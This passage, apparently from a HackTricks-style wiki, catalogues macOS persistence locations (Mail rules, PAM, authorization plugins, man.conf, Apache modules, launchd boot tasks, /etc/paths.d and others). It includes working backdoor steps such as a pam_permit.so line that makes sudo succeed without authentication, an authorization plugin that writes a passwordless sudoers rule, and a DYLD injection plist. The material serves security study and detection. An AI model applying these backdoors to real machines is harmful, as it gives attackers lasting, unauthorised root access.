Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But Mail.app must be configured with an account and running; the trigger is an inbound email
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Editing the rules/scripts from outside Mail may require Mail to be closed and Full Disk Access on modern macOS

#### Location

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (local rules; `V10` on Sonoma/Sequoia, `V11`+ on newer)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-synced rules, take precedence)
- Rule enablement: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Description & Exploitation

An Apple Mail **rule** can have a *"Run AppleScript"* action. By adding a rule that matches a crafted **subject line** and runs an attacker script, the adversary gets **remotely-triggerable, stealthy** code execution in Mail's context whenever the magic email arrives — a vector that evades many persistence scanners because no LaunchAgent/Login Item is created.<sup>[[42]](#references)</sup> Setting the rule to also **delete** the trigger email hides the evidence. Defenders can hunt for it directly:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - Modern macOS requires a **manual user approval** in System Settings → *Device Management* (silent `profiles install` is gone outside MDM)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Installed profiles live under **`/Library/Managed Preferences/`** and **`/var/db/ConfigurationProfiles/`**; a profile is an XML plist with a `PayloadContent` array.

#### Description & Exploitation

A `.mobileconfig` is not a direct code-execution primitive, but it is a durable **control/MITM persistence layer**: it can install a **trusted root CA** (`com.apple.security.root`), set a **global or PAC proxy** (`com.apple.proxy.*`), force **managed preferences** (`com.apple.ManagedClient.preferences`), or apply restrictions. Setting **`PayloadRemovalDisallowed=true`** (or delivering it via MDM/supervision) makes it **user-unremovable**, which is the persistence.<sup>[[44]](#references)</sup>

> [!WARNING]
> A plain configuration profile has **no payload type that drops an arbitrary `LaunchDaemon`/`LaunchAgent`**. Installing a daemon that way requires full **MDM enrollment** plus a management agent/script — do not treat `.mobileconfig` as a launchd delivery mechanism.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **strips** `DYLD_*` for SIP/platform binaries, hardened-runtime apps and setuid targets, so it only injects into unprotected processes and does **not** bypass SIP/the hardened runtime
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Reliable form: the **`EnvironmentVariables`** dict inside a malicious `LaunchAgent`/`LaunchDaemon` plist (runs at login/boot)
- Dead/historical (report only): **`~/.MacOSX/environment.plist`** (removed in 10.8) and **`/etc/launchd.conf`** (removed in 10.10)

#### Description & Exploitation

If an attacker can get `DYLD_INSERT_LIBRARIES` into a victim process' environment, dyld loads the attacker dylib (its constructor runs) into that process. The persistent variant embeds the variable in a LaunchAgent so every launch of the job re-injects. Note that `launchctl setenv DYLD_*` is filtered on modern macOS, so embed it in the plist instead.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

For the full mechanics of dylib injection/hijacking see:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

## Root Sandbox Bypass

> [!TIP]
> Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** being **root** and/or requiring other **weird conditions.**

### Periodic

> [!CAUTION]
> **Historical mechanism:** On the macOS 26.5.2 test machine, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic`, and the `com.apple.periodic-*` launch daemons are absent. Do not assume that creating `/etc/periodic` on a current system will schedule its contents. Check for both the command and an enabled scheduler on the target release before using the example below.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you need to be root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root required
  - **Trigger**: When the time comes
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
  - Root required
  - **Trigger**: When the time comes

#### Description & Exploitation

The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. Note that scripts stored in `/etc/periodic/` are **executed** as the **owner of the file,** so this won't work for a potential privilege escalation.<sup>[[27]](#references)</sup>

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

There are other periodic scripts that will be executed indicated in **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

On older systems with `periodic` and its launch daemons installed and enabled, `/etc/daily.local`, `/etc/weekly.local`, and `/etc/monthly.local` were additional execution paths. A harmless read-only check is:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you need to be root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Root always required

#### Description & Exploitation

As PAM is more focused in **persistence** and malware that on easy execution inside macOS, this blog won't give a detailed explanation, **read the writeups to understand this technique better**.<sup>[[28]](#references)</sup>

Check PAM modules with:

```bash
ls -l /etc/pam.d
```

A persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line:

```bash
auth       sufficient     pam_permit.so
```

So it will **looks like** something like this:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

And therefore any attempt to use **`sudo` will work**.

> [!CAUTION]
> Note that this directory is protected by TCC so it's highly probably that the user will get a prompt asking for access.

Another nice example is su, were you can see that it's also possible to give parameters to the PAM modules (and you coukd also backdoor this file):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you need to be root and make extra configs
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - Root required
  - It's also needed to configure the authorization database to use the plugin

#### Description & Exploitation

You can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Move** the bundle to the location to be loaded:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Finally add the **rule** to load this Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

The **`evaluate-mechanisms`** will tell the authorization framework that it will need to **call an external mechanism for authorization**. Moreover, **`privileged`** will make it be executed by root.

Trigger it with:

```bash
security authorize com.asdf.asdf
```

And then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you need to be root and the user must use man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
  - Root required
  - **`/private/etc/man.conf`**: Whenever man is used

#### Description & Exploit

The config file **`/private/etc/man.conf`** indicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.<sup>[[31]](#references)</sup>

For example set in **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

And then create `/tmp/view` as:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you need to be root and apache needs to be running
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd doesn't have entitlements

#### Location

- **`/etc/apache2/httpd.conf`**
  - Root required
  - Trigger: When Apache2 is started

#### Description & Exploit

You can indicate in `/etc/apache2/httpd.conf` to load a module adding a line such as:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

This way your compiled moduled will be loaded by Apache. The only thing is that either you need to **sign it with a valid Apple certificate**, or you need to **add a new trusted certificate** in the system and **sign it** with it.

Then, if needed , to make sure the server will be started you could execute:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Code example for the Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you need to be root, auditd be running and cause a warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
  - Root required
  - **Trigger**: When auditd detects a warning

#### Description & Exploit

Whenever auditd detects a warning the script **`/etc/security/audit_warn`** is **executed**. So you could add your payload on it.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **This is deprecated, so nothing should be found in those directories.**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: A shell script executed at startup.
2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.

Ensure that both the rc script and the `StartupParameters.plist` file are correctly placed inside the **StartupItem** directory for the startup process to recognize and utilize them.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> I cannot find this component in my macOS so for more info check the writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Introduced by Apple, **emond** is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. While not particularly beneficial for a Mac administrator, this obscure service could serve as a subtle persistence method for threat actors, likely unnoticed by most macOS admins.<sup>[[34]](#references)</sup>

For those aware of its existence, identifying any malicious usage of **emond** is straightforward. The system's LaunchDaemon for this service seeks scripts to execute in a single directory. To inspect this, the following command can be used:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root required
  - **Trigger**: With XQuartz

#### Description & Exploit

XQuartz is **no longer installed in macOS**, so if you want more info check the writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Installing a kext is so complicated, even as root, that this is not considered a practical sandbox-escape or persistence technique unless you have an exploit.

#### Location

In order to install a KEXT as a startup item, it needs to be **installed in one of the following locations**:

- `/System/Library/Extensions`
  - KEXT files built into the OS X operating system.
- `/Library/Extensions`
  - KEXT files installed by 3rd party software

You can list currently loaded kext files with:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Location

- **`/usr/local/bin/amstoold`**
  - Root required

#### Description & Exploitation

Apparently the `plist` from `/System/Library/LaunchAgents/com.apple.amstoold.plist` was using this binary while exposing a XPC service... the thing is that the binary didn't exist, so you could place something there and when the XPC service gets called your binary will be called.<sup>[[35]](#references)</sup>

I can no longer find this in my macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root required
  - **Trigger**: When the service is run (rarely)

#### Description & exploit

Apparently it's not very common to run this script and I couldn't even find it in my macOS, so if you want more info check the writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **This isn't working in modern MacOS versions**

It's also possible to place here **commands that will be executed at startup.** Example os regular rc.common script:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd Boot Tasks

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root)
- Root required, plus either a **SIP bypass** or the **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access permission, depending on the path

#### Location

`launchd` embeds a plist in its **`__TEXT,__config`** section describing early "boot tasks". Several reference scripts/binaries that do **not** exist by default and can be created by an attacker:

- SIP-bypass set: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA set: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` pre-exists only on Sequoia+)

#### Description & Exploitation

Dump the embedded task table to see which files `launchd` will run and the supported keys (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Creating one of the referenced files (e.g. `/etc/rc.server`) makes `launchd` execute it on the next (userspace) reboot. The most useful entries are gated by SIP or require TCC SysAdminFiles/Full Disk Access, so this is a root-level, reboot-triggered technique.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

The `rc.trampoline` boot task runs a **platform (Apple-signed) binary** stored in the `apple-trusted-trampoline` NVRAM variable at boot, but **only when the `rc.trampoline=1` boot-arg is set and SIP is disabled** (with a ~390&nbsp;KB size limit and a blocking/return-fast constraint). Because it requires **root + SIP disabled + an Apple-signed payload**, it is essentially impractical for real-world persistence and is listed here only for completeness.<sup>[[41]](#references)</sup>

### /etc/paths and /etc/paths.d (PATH hijack)

- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root to write)
- Root required

#### Location

- **`/etc/paths`** and **`/etc/paths.d/*`** — read by **`path_helper`** (invoked from `/etc/zprofile`) to build the default `PATH` at login.

#### Description & Exploitation

Both are root-owned. Prepending an attacker-controlled directory (by editing `/etc/paths` or dropping a file in `/etc/paths.d/`) makes that directory appear early in every new login shell's `PATH`, so a malicious binary named like a common command (`ls`, `git`, …) **shadows** the real one and runs the next time the victim invokes it.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Useful to bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (needs root)
- Root required; result **bypasses SIP**. Affected macOS **15.0–15.1**, fixed in **15.2**

#### Location

- Drop a filesystem bundle in **`/Library/Filesystems/`**.

#### Description & Exploitation

`storagekitd` holds the entitlement **`com.apple.rootless.install.heritable`** and spawned the binaries of filesystem bundles with that SIP-bypassing capability **inherited**. By planting a malicious filesystem bundle, an attacker could run code with a SIP bypass to install **persistent kernel extensions** or write into SIP-protected `LaunchDaemon` directories — persistence that survives and defeats normal protections.<sup>[[46]](#references)</sup> Apple fixed it in macOS Sequoia 15.2.

## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Beyond the good ol' LaunchAgents - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Beyond the good ol' LaunchAgents - 18 - X11 and XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Beyond the good ol' LaunchAgents - 21 - Re-opened Applications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Beyond the good ol' LaunchAgents - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Beyond the good ol' LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Beyond the good ol' LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook and LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Beyond the good ol' LaunchAgents - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Beyond the good ol' LaunchAgents - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Beyond the good ol' LaunchAgents - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Beyond the good ol' LaunchAgents - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Beyond the good ol' LaunchAgents - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Folder Actions for Persistence on macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Beyond the good ol' LaunchAgents - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Beyond the good ol' LaunchAgents - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Beyond the good ol' LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analyzing "Mac File Opener" Persistence (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Beyond the good ol' LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Saving Your Access: Screensavers for macOS Persistence (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Beyond the good ol' LaunchAgents - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Beyond the good ol' LaunchAgents - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Beyond the good ol' LaunchAgents - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Beyond the good ol' LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Beyond the good ol' LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Persistent Credential Theft with Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Beyond the good ol' LaunchAgents - 30 - The man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Beyond the good ol' LaunchAgents - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Beyond the good ol' LaunchAgents - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Beyond the good ol' LaunchAgents - 23 - emond, The Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Beyond the good ol' LaunchAgents - 10 - Application script files](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Beyond the good ol' LaunchAgents - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Beyond the good ol' LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Beyond the good ol' LaunchAgents - 34 - launchd boot tasks](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Beyond the good ol' LaunchAgents - 35 - Persist through the NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Using email for persistence on OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Suspicious Apple Mail Rule Plist Modification (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Malicious Profiles - One of the Most Serious Threats to Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analyzing CVE-2024-44243, a macOS SIP bypass through kernel extensions (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)

{{#include ../banners/hacktricks-training.md}}
